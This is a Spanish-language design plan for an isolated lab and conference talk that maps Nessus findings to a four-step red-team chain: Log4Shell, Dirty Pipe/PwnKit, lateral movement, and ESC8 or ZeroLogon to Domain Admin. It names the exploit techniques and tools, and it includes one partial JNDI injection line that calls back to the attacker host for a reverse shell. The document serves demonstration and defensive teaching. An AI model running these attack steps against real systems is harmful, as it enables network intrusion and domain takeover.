# BIFROST — Laboratorio de demostración "del hallazgo al dominio"

> **Tesis de la charla:** el escáner no explota, *prioriza*. El red team no adivina, *valida*.
> Bifrost es el puente entre lo que Tenable reporta y lo que realmente se puede ejecutar.
>
> **Formato:** 30 min (25 demo + 5 cierre). Dos voces alternando: Tenable muestra el *qué*, tú demuestras el *cómo*.

> **Decisiones congeladas (2026-11-20):** Tenable One (Vulnerability Management + Attack Path Analysis) · VMware Workstation Pro 17.x / Fusion 13.x · ESC8 como puente final.
>
> **Valores:** todos los del laboratorio (IPs, dominio, puertos, credenciales) viven en [config/lab.env](config/lab.env) y están catalogados en [docs/VALUES.md](docs/VALUES.md). Este documento no los repite: describe el diseño. El detalle operativo está en [README.md](README.md).

---

## 1. Principio de diseño: construir al revés

El error clásico es armar una máquina "vulnerable" bonita y descubrir en el ensayo que Nessus no la marca, o la marca con un plugin que no se puede explotar.

**Regla de oro:** se elige primero el **plugin de Nessus**, después la **versión exacta** que lo dispara, y al final el **exploit**.

```
plugin Nessus (ID + severidad + VPR)
        ↓
versión/OS/misconfig que garantiza el match
        ↓
PoC reproducible en < 60 segundos
        ↓
salida visual inequívoca (id / whoami / hash)
```

Cada eslabón de la cadena debe cumplir 4 criterios:

| Criterio | Por qué |
|---|---|
| Detección fiable (sin falsos negativos) | Si el escáner no lo ve, la charla no existe |
| Exploit < 60 s | El público pierde atención con esperas |
| Salida visual obvia | `uid=0(root)`, `NT AUTHORITY\SYSTEM`, hash de `krbtgt` |
| Reversible por snapshot | Un demo en vivo **va** a romper algo |

---

## 2. Arquitectura

```
┌─────────────────────────────────────────────────────────────┐
│ Equipo de construccion (VMware Workstation / Fusion)        │
│                                                             │
│   Red host-only 192.168.56.0/24  (SIN internet, SIN NAT)    │
│                                                             │
│   [kali .66] ───────┬──────── [nessus .10]                  │
│                     │                                       │
│            ┌────────┴─────────┐                             │
│       DMZ simulada        LAN corporativa                   │
│            │                  │                             │
│      [web01 .20] ────── [app02 .21]   [ws01 .31] ── [dc01 .30] │
│      Solr 8.11           privesc      Windows 10    AD DS + ADCS │
│      Log4Shell           kernel       credenciales  ESC8 → DA    │
└─────────────────────────────────────────────────────────────┘
```

### Reglas de red (esto es lo que hace el demo creíble)

- **Aislamiento total:** VMnet1 / host-only o bridge interno de Proxmox. Sin NAT, sin salida a internet.
- **Pivote forzado:** el atacante *solo* alcanza `web01:8983`. Todo lo demás se llega desde `web01` con `chisel` / `ligolo-ng`. Eso convierte un exploit en una **campaña**.
- **El escáner sí ve todo:** Nessus está en la misma red y escanea los 4 hosts. Esa asimetría (scanner ve todo, atacante ve una puerta) es un punto narrativo potente.
- **Si usan Tenable Vulnerability Management en la nube:** Nessus local como *linked scanner*. El tráfico de gestión sale por el hotspot del presentador, el tráfico de escaneo nunca sale del host.

### Inventario

| Host | OS | Rol | Vulnerabilidad sembrada | Bridge |
|---|---|---|---|---|
| `kali` | Kali | atacante | — | — |
| `nessus` | Ubuntu | scanner | — | — |
| `web01` | Ubuntu 20.04 | app expuesta | Solr 8.11.0 → Log4Shell (CVE-2021-44228) | 1: acceso inicial |
| `app02` | Ubuntu 20.04 | servidor interno | kernel 5.13 / policykit 0.105 → CVE-2022-0847 o CVE-2021-4034 | 2: root |
| `ws01` | Windows 10 | estación | credenciales en archivo compartido / sesión SMB | 3: movimiento lateral |
| `dc01` | Server 2019 sin parchear | DC + ADCS | ESC8 (PetitPotam + relay) o CVE-2020-1472 | 4: Domain Admin |

**Hardware:** 4–5 VMs, 16 GB RAM cómodo, 12 GB mínimo. Snapshots en SSD.

---

## 3. La cadena de ataque (los 4 puentes)

Cada bloque de la charla es un puente: **lo que dijo Nessus → lo que hice → la evidencia**.

### Puente 1 — Acceso inicial: Log4Shell
- **Nessus:** familia Log4Shell (varios plugins, familia 155999+), CVSS 10.0. Tenable fue de los primeros en detectarlo — buen guiño al equipo.
- **Manual:** `curl` con `${jndi:ldap://192.168.56.66:1389/...}` contra el endpoint vulnerable de Solr → reverse shell como usuario del servicio.
- **Evidencia:** `id`, `hostname`, `ip a`.
- **Por qué este:** un `curl` de una línea. Cero dependencias, cero compilación, y el escáner lo detecta con precisión quirúrgica.

### Puente 2 — Elevación: kernel / PwnKit
- **Nessus:** requiere **credenciales** (checks locales). Aquí está el momento didáctico: *"sin credenciales veo la puerta; con credenciales veo la casa"*.
- **Manual:** PoC de CVE-2022-0847 (Dirty Pipe) o CVE-2021-4034 (PwnKit) → `root`.
- **Evidencia:** `uid=0(root)`.

### Puente 3 — Movimiento lateral
- **Nessus:** SMB signing deshabilitado, credenciales débiles, servicios expuestos en `ws01`/`app02`.
- **Manual:** credenciales en un archivo de configuración / hash capturado → `netexec` o `evil-winrm` contra el siguiente salto.
- **Evidencia:** shell en un host distinto, sin volver a explotar nada.

### Puente 4 — Dominio: ESC8 o ZeroLogon
- **Opción A (recomendada) — ESC8:** ADCS con Web Enrollment sobre HTTP. `PetitPotam` fuerza autenticación del DC → relay NTLM a `/certsrv` → certificado de `dc01$` → `certipy auth` → DCSync. Moderno, casi nada destructivo, y es la técnica que más se ve en red team real 2023–2025.
- **Opción B (más explosiva) — ZeroLogon CVE-2020-1472:** un comando, `Success!`, y luego `secretsdump` saca el hash de `krbtgt`. **Rompe el DC**: obligatorio snapshot y revert.
- **Evidencia:** hash de `krbtgt` / `Administrator`, `net group "Domain Admins"`, y acceso al recurso señuelo.

**Recomendación:** A en el guion, B como "si quieren el golpe visual". O A en vivo y B en un clip pre-grabado de 20 s.

### Plan B por si algo no compila
| Si falla | Alternativa igual de vistosa |
|---|---|
| Solr | GitLab 13.10 → CVE-2021-22205 (subir un `DjVu`, shell como `git`) |
| PwnKit | `sudo` mal configurado / binario SUID custom |
| ESC8 | PrintNightmare (CVE-2021-34527) o ProxyShell si montan Exchange |
| Todo | `vsftpd 2.3.4` backdoor — feo, viejo, pero nunca falla |

**Nombre en el escenario:** si un paso se cae, se dice en voz alta *"esto es exactamente lo que pasa en producción: el exploit no siempre funciona a la primera"* y se salta al plan B. Eso suma credibilidad, no la resta.

---

## 4. Cómo construirlo (reproducible, no a mano)

Nada de "instalar a mano y rezar". El repo se ve así:

```
Bifrost/
├── packer/                 # imágenes base (vmware-iso / proxmox-iso)
│   ├── ubuntu-2004.pkr.hcl
│   └── windows-2019.pkr.hcl
├── ansible/
│   ├── site.yml
│   └── roles/
│       ├── vuln-solr/          # baja Solr 8.11.0 y lo deja expuesto
│       ├── vuln-kernel/        # kernel exacto vulnerable
│       ├── ad-dc/              # DC + dominio corp.local
│       ├── adcs-esc8/          # CA + Web Enrollment por HTTP
│       ├── decoys/             # archivos señuelo
│       └── no-hardening/       # desactiva lo que estorba
├── vagrant/                # Vagrantfile para iterar rápido
├── tenable/
│   ├── scan-policy.json        # perfil de escaneo versionado
│   ├── creds.md                # SMB/WMI y SSH (nunca en el repo)
│   └── run-scan.py             # API: lanza, espera, exporta .nessus
├── runbook/                # guion minuto a minuto + comandos copy/paste
└── slides/
```

**Comandos objetivo:**

```bash
make build     # packer build de las 4 imágenes  (~40 min, una vez)
make lab       # vagrant up / terraform apply    (~5 min)
make snapshot  # estado "pre-demo" limpio
make scan      # lanza el escaneo por API de Nessus y exporta resultados
make reset     # revierte TODO a pre-demo en <60 s
```

`make reset` es el comando más importante del proyecto. Sin él no hay charla en vivo.

### Configuración de Tenable (lo que hay que dejar listo)

1. **Escaneo sin credenciales** y **con credenciales** sobre el mismo rango → dos reportes, y la charla muestra la diferencia de hallazgos. Es el mejor argumento de "por qué credenciales".
2. **Perfil:** Basic Network Scan + Web App Tests. Nada de "paranoid" que tarde 40 min.
3. **Plugin IDs en las slides.** Verifica el ID exacto en el ensayo y ponlo en pantalla: `Plugin 155999` al lado del `curl`. Da una credibilidad brutal.
4. **Attack Path Analysis / VPR** (si tienen Tenable One): mostrar que el escáner predice la ruta y luego tú la recorres. Cierre perfecto.
5. **Export .nessus** y guardarlo: es el respaldo si la red del venue falla.

---

## 5. Guion minuto a minuto

| Min | Qué pasa | Quién |
|---|---|---|
| 00:00 | Hook: *"Tenemos 47 críticos en el reporte. ¿Cuál es el que importa?"* + slide de arquitectura | Tú |
| 03:00 | Perfil de escaneo, credenciales, lanzar scan (ya corriendo desde antes) | Tenable |
| 05:00 | Triage: 3 hallazgos, VPR, plugin IDs, Attack Path | Tenable |
| 08:00 | **Puente 1** — slide "Nessus dijo X" → `curl` → shell | Tú |
| 12:00 | **Puente 2** — privesc a root | Tú |
| 15:00 | **Puente 3** — credenciales → movimiento lateral | Tú |
| 19:00 | **Puente 4** — AD → Domain Admin (el *wow*) | Tú |
| 24:00 | Impacto **controlado**: leer el señuelo, no cifrar nada | Tú |
| 26:00 | Blue team: qué logs habría dejado (4624/4625, 4768/4769, 1102, Sysmon 1/3) | Tenable |
| 29:00 | Cierre: escáner + red team = riesgo priorizado. Q&A | Ambos |

**Truco de ritmo:** al inicio del bloque de cada puente, una slide de 3 líneas con el hallazgo crudo de Nessus. Después, terminal. Alternar slide → terminal → slide → terminal mantiene la atención mucho mejor que 15 minutos de terminal.

---

## 6. Ensayos

1. **Ensayo A — técnico:** build completo desde cero. Anotar tiempos reales de cada exploit.
2. **Ensayo B — cronometrado:** guion completo, con proyector, sin ayudas.
3. **Ensayo C — caos:** romper algo a propósito (apagar `web01`, bloquear el puerto, tardar el escaneo) y practicar el plan B en vivo.
4. **Ensayo D — el día anterior:** `make reset`, verificar que el snapshot arranca, escaneo pre-lanzado y guardado.

**Regla:** nunca se estrena un comando en el escenario. Todo lo que se teclea en vivo está en el runbook y se ha ejecutado ≥5 veces.

---

## 7. Riesgos y contingencias

| Riesgo | Mitigación |
|---|---|
| El escaneo tarda 20 min en vivo | Se lanza antes de empezar; en pantalla solo se muestra el progreso/resultado |
| Exploit falla en el escenario | Plan B (tabla §3) + clip de respaldo de 90 s ya grabado |
| Red del venue bloquea / no hay internet | Todo local; Tenable VM con hotspot propio; export `.nessus` offline |
| ZeroLogon deja el DC inservible | Snapshot obligatorio + `make reset` |
| Licencia de Nessus / límite de hosts | Verificar licencia con el equipo Tenable con semanas de antelación |
| Se rompe el aislamiento y sale a internet | Regla de firewall explícita deny-all en el host; verificar con `tcpdump` |
| Alguien pregunta "¿esto es real?" | Slide de alcance: infra propia, dominio falso, datos falsos, autorización por escrito |

**Datos siempre falsos:** `corp.local`, usuarios inventados, señuelos tipo `Q4_Forecast.xlsx`, `payroll_2026.csv`, `vpn_config.ovpn`. Nunca un nombre real de la empresa, nunca un cliente real.

---

## 8. El ángulo que gana la charla

La mayoría de demos de red team terminan en "y fui domain admin". La tuya debe terminar en:

1. **El escáner tenía razón** — el hallazgo era real y explotable, no ruido.
2. **El escáner no podía saberlo todo** — la cadena (1+1+1+1) es lo que convierte cuatro "medios" en un compromiso total. Eso es lo que solo el red team demuestra.
3. **La remediación cambia** — no es "parchea los 47 críticos", es "rompe el puente 3 y la cadena muere". Priorización real.
4. **El blue team gana algo** — la telemetría que habría detectado cada puente.

Ese cierre convierte una demo de hacking en una conversación de **gestión de riesgo**, que es exactamente lo que un vendor de exposición quiere oír.

---

## 9. Checklist de arranque

- [ ] Confirmar edición de Tenable disponible (Nessus Pro / Tenable VM / Tenable One) y licencia de hosts
- [ ] Decidir hipervisor (VMware Workstation Pro para snapshots, o Proxmox si hay mini PC)
- [ ] Nombre y tema del lab (Bifrost, `corp.local`)
- [ ] Elegir el "wow" final: ESC8 vs ZeroLogon
- [ ] Congelar versiones exactas (Solr 8.11.0, kernel, Server 2019 build sin parchear)
- [ ] Primer `make build` y escaneo de validación con los 4 plugins visibles
- [ ] Guion + slides (una slide por puente con el output crudo de Nessus)
- [ ] Clip de respaldo grabado
